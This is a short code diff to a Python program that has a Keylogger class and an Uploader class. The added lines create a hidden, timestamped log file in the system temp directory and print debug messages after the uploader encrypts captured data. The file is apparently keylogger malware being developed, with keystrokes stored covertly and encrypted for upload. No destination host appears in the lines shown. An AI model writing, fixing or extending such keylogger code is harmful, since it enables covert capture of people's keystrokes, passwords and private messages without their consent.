@@ -48,6 +48,14 @@ class Keylogger:
         self.filename = join(gettempdir(), f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
         print(f"Log file path: {self.filename}")  # Debug: Print log file path
 
+        # Ensure the log file is created
+        try:
+            with open(self.filename, 'w') as f:
+                f.write("Initializing log file...\n")
+            print(f"Log file created: {self.filename}")
+        except Exception as e:
+            print(f"Error creating log file: {e}")
+
     def savefile(self, data: str) -> None:
         try:
             file_exists = isfile(self.filename)
@@ -110,6 +118,7 @@ class Uploader:
             encrypted_data = cipher_suite.encrypt(data)
             with open(self.encrypted_filename, 'wb') as f:
                 f.write(encrypted_data)
+            print(f"File encrypted: {self.encrypted_filename}")  # Debug: Print success message
         except Exception as e:
             alarm(f'Encryption Error: {e}')
 
